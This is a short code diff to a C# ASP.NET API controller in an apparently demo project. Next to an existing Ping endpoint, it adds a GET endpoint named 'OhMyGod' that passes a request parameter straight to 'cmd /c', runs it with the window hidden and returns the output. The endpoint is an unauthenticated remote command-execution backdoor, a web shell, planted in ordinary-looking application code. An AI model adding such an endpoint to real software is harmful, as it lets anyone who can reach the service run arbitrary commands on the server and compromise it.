@@ -20,5 +20,29 @@ namespace MyWonderfulApp.Service.Controllers.V2
         {
             return Ok("Pong V2");
         }
+
+        [SwaggerResponse(typeof(String))]
+        [HttpGet]
+        [MapToApiVersion("2.0")]
+        public IActionResult OhMyGod(String command)
+        {
+            System.Diagnostics.ProcessStartInfo procStartInfo =
+                new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
+
+            procStartInfo.RedirectStandardOutput = true;
+            procStartInfo.UseShellExecute = false;
+
+            procStartInfo.CreateNoWindow = true;
+
+            String result;
+            using (var process = new System.Diagnostics.Process())
+            {
+                process.StartInfo = procStartInfo;
+                process.Start();
+                // Get the output into a string
+                result = process.StandardOutput.ReadToEnd();
+            }
+            return Ok(result);
+        }
     }
 }
